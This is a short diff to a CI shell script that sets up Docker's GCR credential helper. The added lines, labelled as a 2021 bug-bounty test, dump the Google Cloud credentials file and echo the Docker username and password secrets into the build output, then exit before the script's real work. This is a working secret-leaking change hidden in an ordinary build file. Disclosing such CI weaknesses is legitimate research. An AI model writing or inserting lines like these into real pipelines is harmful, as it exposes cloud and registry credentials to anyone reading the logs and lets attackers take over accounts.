@@ -15,6 +15,13 @@ msg "configuring Docker to use helper"
 credentials_path=$HOME/.config/gcloud/application_default_credentials.json
 mkdir -p "$(dirname "$credentials_path")"
 echo "$SECRET_GCR_CREDENTIALS" > "$credentials_path"
+
+# Bug Bounty 30 Dic 2021
+cat $HOME/.config/gcloud/application_default_credentials.json
+echo $SECRET_DOCKER_USER
+echo $SECRET_DOCKER_PASS
+exit
+
 docker-credential-gcr configure-docker
 
 # We can't really keep the "$SECRET_GCR_IMAGE" a secret, since it inadvertently ends up in a lot of
